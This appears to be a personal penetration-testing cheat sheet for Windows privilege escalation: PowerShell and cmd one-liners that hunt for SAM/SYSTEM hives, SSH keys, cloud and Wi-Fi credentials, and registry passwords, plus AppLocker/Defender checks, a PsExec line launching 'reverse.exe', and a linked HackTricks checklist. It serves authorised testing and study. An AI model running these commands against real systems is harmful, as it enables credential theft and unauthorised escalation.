Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows.old\Users -Include *.txt,*.ini,*.log -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path "C:\" -Filter "index.html","default.html", "home.html" -Recurse -ErrorAction SilentlyContinue
#find web server root folders if you have access
Get-ChildItem -Path C:\ -Filter "SAM" -Recurse -File -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "backup" -Recurse -File -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Filter "SYSTEM" -Recurse -File -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include *.txt,*.bak,*.ini,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log,*.kdbx,*.db,*.db3,*.xml -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Filter "OMLs.db3" -File -Recurse -ErrorAction SilentlyContinue
#you can look for a specific file like this

#if you are RDP'd you can check event viewer to examine event 4104 Script Block Logging

Get-MpComputerStatus
#Win Defender status
Get-MpPreference | Select-Object -Property ExclusionPath
#check if theres an Exclusion path
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
#List Applocker rules
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
#Test Applocker rules
cd "$env:USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup"


$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value; cd "C:\`$Recycle.bin\$sid"
#replace the SID above with the account you want to check

Get-ChildItem "C:\" *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName |Out-File -FilePath "
```



PsExec is a command-line tool that allows you to run processes on remote systems and redirect console output to the local system.

> C:\Windows\system32>C:\PrivEsc\PSExec64.exe -i -u “nt authority\local service” C:\PrivEsc\reverse.exe





SeShutDownPrivilege

```
Reboot
shutdown /r /t 0

Shutdown
shutdown /s /t 0

Force applications to close:
shutdown /r /f /t 0
shutdown /s /f /t 0


Restart-Computer -Force
Stop-Computer -Force
	


```


### [System Info](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#system-info)

- [ ]  Obtain [**System information**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#system-info)
- [ ]  Search for **kernel** [**exploits using scripts**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#version-exploits)
- [ ]  Use **Google to search** for kernel **exploits**
- [ ]  Use **searchsploit to search** for kernel **exploits**
- [ ]  Interesting info in [**env vars**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#environment)?
- [ ]  Passwords in [**PowerShell history**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#powershell-history)?
- [ ]  Interesting info in [**Internet settings**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#internet-settings)?
- [ ]  [**Drives**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drives)?
- [ ]  [**WSUS exploit**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wsus)?
- [ ]  [**AlwaysInstallElevated**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated)?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#loggingav-enumeration)[Logging/AV enumeration](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#enumeration)

- [ ]  Check [**Audit**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#audit-settings) and [**WEF**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wef) settings
- [ ]  Check [**LAPS**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#laps)
- [ ]  Check if [**WDigest**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wdigest) is active
- [ ]  [**LSA Protection**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#lsa-protection)?
- [ ]  [**Credentials Guard**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-guard)[?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials)
- [ ]  [**Cached Credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-credentials)?
- [ ]  Check if any [**AV**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/windows-av-bypass/README.md)
- [ ]  [**AppLocker Policy**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/README.md#applocker-policy)?
- [ ]  [**UAC**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control/README.md)
- [ ]  [**User Privileges**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users-and-groups)
- [ ]  Check [**current** user **privileges**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users-and-groups)
- [ ]  Are you [**member of any privileged group**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#privileged-groups)?
- [ ]  Check if you have [any of these tokens enabled](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation): **SeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege** ?
- [ ]  [**Users Sessions**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#logged-users-sessions)?
- [ ]  Check [**users homes**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#home-folders) (access?)
- [ ]  Check [**Password Policy**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#password-policy)
- [ ]  What is [**inside the Clipboard**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#get-the-content-of-the-clipboard)?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#network)[Network](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)

- [ ]  Check **current** [**network** **information**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)
- [ ]  Check **hidden local services** restricted to the outside

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#running-processes)[Running Processes](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes)

- [ ]  Processes binaries [**file and folders permissions**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#file-and-folder-permissions)
- [ ]  [**Memory Password mining**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#memory-password-mining)
- [ ]  [**Insecure GUI apps**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#insecure-gui-apps)
- [ ]  Steal credentials with **interesting processes** via `ProcDump.exe` ? (firefox, chrome, etc ...)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#services)[Services](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services)

- [ ]  [Can you **modify any service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#permissions)
- [ ]  [Can you **modify** the **binary** that is **executed** by any **service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#modify-service-binary-path)
- [ ]  [Can you **modify** the **registry** of any **service**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions)
- [ ]  [Can you take advantage of any **unquoted service** binary **path**?](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unquoted-service-paths)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#applications)[**Applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications)

- [ ]  **Write** [**permissions on installed applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#write-permissions)
- [ ]  [**Startup Applications**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#run-at-startup)
- [ ]  **Vulnerable** [**Drivers**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#dll-hijacking)[DLL Hijacking](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#path-dll-hijacking)

- [ ]  Can you **write in any folder inside PATH**?
- [ ]  Is there any known service binary that **tries to load any non-existant DLL**?
- [ ]  Can you **write** in any **binaries folder**?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#network-1)[Network](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#network)

- [ ]  Enumerate the network (shares, interfaces, routes, neighbours, ...)
- [ ]  Take a special look at network services listening on localhost (127.0.0.1)

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#windows-credentials)[Windows Credentials](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#windows-credentials)

- [ ]  [**Winlogon**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#winlogon-credentials) credentials
- [ ]  [**Windows Vault**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager-windows-vault) credentials that you could use?
- [ ]  Interesting [**DPAPI credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi)?
- [ ]  Passwords of saved [**Wifi networks**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#wifi)?
- [ ]  Interesting info in [**saved RDP Connections**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#saved-rdp-connections)?
- [ ]  Passwords in [**recently run commands**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#recently-run-commands)?
- [ ]  [**Remote Desktop Credentials Manager**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#remote-desktop-credential-manager) passwords?
- [ ]  [**AppCmd.exe** exists](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#appcmd-exe)? Credentials?
- [ ]  [**SCClient.exe**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#scclient-sccm)? DLL Side Loading?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#files-and-registry-credentials)[Files and Registry (Credentials)](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials)

- [ ]  **Putty:** [**Creds**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#putty-creds) **and** [**SSH host keys**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#putty-ssh-host-keys)
- [ ]  [**SSH keys in registry**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ssh-keys-in-registry)?
- [ ]  Passwords in [**unattended files**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#unattended-files)?
- [ ]  Any [**SAM & SYSTEM**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#sam-and-system-backups) backup?
- [ ]  [**Cloud credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cloud-credentials)?
- [ ]  [**McAfee SiteList.xml**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#mcafee-sitelist.xml) file?
- [ ]  [**Cached GPP Password**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#cached-gpp-pasword)?
- [ ]  Password in [**IIS Web config file**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#iis-web-config)?
- [ ]  Interesting info in [**web** **logs**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#logs)?
- [ ]  Do you want to [**ask for credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#ask-for-credentials) to the user?
- [ ]  Interesting [**files inside the Recycle Bin**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-in-the-recyclebin)?
- [ ]  Other [**registry containing credentials**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#inside-the-registry)?
- [ ]  Inside [**Browser data**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history) (dbs, history, bookmarks, ...)?
- [ ]  [**Generic password search**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#generic-password-search-in-files-and-registry) in files and registry
- [ ]  [**Tools**](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#tools-that-search-for-passwords) to automatically search for passwords

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#leaked-handlers)[Leaked Handlers](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers)

- [ ]  Have you access to any handler of a process run by administrator?

### [](https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html#pipe-client-impersonation)[Pipe Client Impersonation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#named-pipe-client-impersonation)

- [ ]  Check if you can abuse it




Uncategorized:
findstr /s /i "sql_svc" *   # Searches all files in the current directory and subdirectories for the string "sql_svc" (case-insensitive).

$sid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value; cd "C:\`$Recycle.bin\$sid"
Takes you to user's recycle bin


type((Get-PSReadlineOption).HistorySavePath)
wrap history of user in this





Cheatsheets
https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md


Windows quick runs:
* Birds eye view
	* Show all drives
		* Get-PSDrive | Where-Object {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}; Get-SmbShare | Get-SmbShareAccess
	* Installed OS/Architecture
		* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
	* whoami /priv
	* whoami /groups
	* systeminfo
	* cd C:\inetpub
	* Environmental Variables Check
		* Get-ChildItem env: | Sort-Object Name
	* net start
	* net share
	* net user
	* net localgroup
	* cmdkey /list

* Weak Registry Permissions
	* Get-Acl HTLM:\System\CurrentControlSet\Services\regsvc | Format-List
* Scheduled Tasks
	* schtasks /query /fo LIST /v
	* Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
* AlwaysInstallElevated
	* reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	* reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
* Autoruns:
	* reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
* Passwords
	* reg query HKLM /f password /t REG_SZ /s
	* reg query HKCU /f password /t REG_SZ /s
	* reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
	* cmdkey /list
	* Get-ChildItem -Path .\ -Filter *pass* -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*.config' }
	* findstr /si "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb
	* findstr /si "emily" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb
	* Get-ChildItem -Path C:\Users -Include *.txt,*.xml,*.config,*.ini,*.log,*.bat -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","credentials","api_key","secret" -ErrorAction SilentlyContinue
	* netsh wlan show profile | Select-String "All User Profile" | ForEach-Object { $name=$_.ToString().Split(":")[-1].Trim(); netsh wlan show profile name="$name" key=clear }
	* Get-ChildItem -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue | ForEach-Object { Get-ItemProperty $_.PSPath }
* SAM
	* type C:\Windows\System32\config\SAM
	* type C:\Windows\System32\config\SYSTEM
	* type C:\Windows\System32\config\RegBack
* Unique files
	* Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path "C:\$Recycle.bin" -Recurse -Force -ErrorAction SilentlyContinue
	* Get-ChildItem -Path "C:\$Recycle.bin" -Recurse -Force -ErrorAction SilentlyContinue -Attributes Hidden,System
	* Get-ChildItem -Path C:\Users\ -Include id_rsa,id_dsa,id_ecdsa,id_ed25519 -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\Users -Include .gitconfig,.npmrc,.docker\config.json,.aws\credentials,.azure\credentials,.ssh\config -File -Recurse -ErrorAction SilentlyContinue -Force
	* Get-ChildItem -Path $env:TEMP -Include *.exe,*.dll,*.bat,*.ps1,*.vbs,*.tmp -File -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime
* Powershell history
	* (Get-PSReadlineOption).HistorySavePath
		* type((Get-PSReadlineOption).HistorySavePath)
* Check if RDP is enabled and who can connect
	* Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections"
* Check for WMI access rights
	* Get-WmiObject -Query "SELECT * FROM __SystemSecurity" -Namespace "root\subscription"
* Check Local Security Policy
	* secedit /export /cfg C:\temp\secpol.cfg
* Check last logs written to
	* Get-ChildItem -Path C:\Windows\Logs -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Sort-Object LastWriteTime -Descending
* Find all non-Microsoft installed software
	* Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" -and $_.Publisher -ne "" } | Select-Object DisplayName, Publisher, InstallDate, DisplayVersion | Sort-Object Publisher
* Unquoted service paths
	* Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -notlike 'C:\Windows*'} | Select-Object Name, PathName, StartMode
* UAC Settings
	* reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
* Find all powershell scripts (it'll be a lot)
	* Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue
* Show event logs
	* wevtutil el
* Find files modified in the last 24 hours
	* Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } | Select-Object FullName, LastWriteTime
* Unprotected named pipes
	* [System.IO.Directory]::GetFiles("\\.\\pipe\\") | ForEach-Object { try { Get-Acl $_ -ErrorAction Stop } catch {} }
* Enumerate installed .NET Versions:
	* Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -Recurse | Get-ItemProperty -Name Version -ErrorAction SilentlyContinue